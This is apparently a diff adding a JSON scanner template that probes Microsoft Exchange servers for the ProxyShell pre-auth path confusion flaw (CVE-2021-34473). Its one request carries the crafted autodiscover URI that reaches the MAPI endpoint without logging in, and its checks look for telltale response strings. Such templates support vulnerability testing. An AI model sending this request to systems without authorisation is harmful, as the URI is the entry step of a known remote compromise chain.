@@ -1,0 +1,45 @@
+{
+    "Name": "ExchangeServer-Pre-auth-Path-Confusion",
+    "Description": "Microsoft Exchange Server Pre-auth Path Confusion vulnerability (CVE-2021-34473) ",
+    "Product": "Microsoft",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
+        "Uri":"/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+            {
+                "Operation": "contains",
+                "Key":"",
+                "Value": "Exchange MAPI/HTTP Connectivity Endpoint"
+            }, {
+                "Operation": "contains",
+                "Key":"",
+                "Value": "Authentication"
+            },{
+                "Operation": "contains",
+                "Key":"",
+                "Value": "Negotiate"
+            },{
+                "Operation": "contains",
+                "Key":"",
+                "Value": "TenantGuid::"
+            },
+            {
+                "Operation": "code",
+                "Key":"",
+                "Value": "200"
+            }
+
+        ]
+        },
+        "Next_decide":""
+                }
+]}
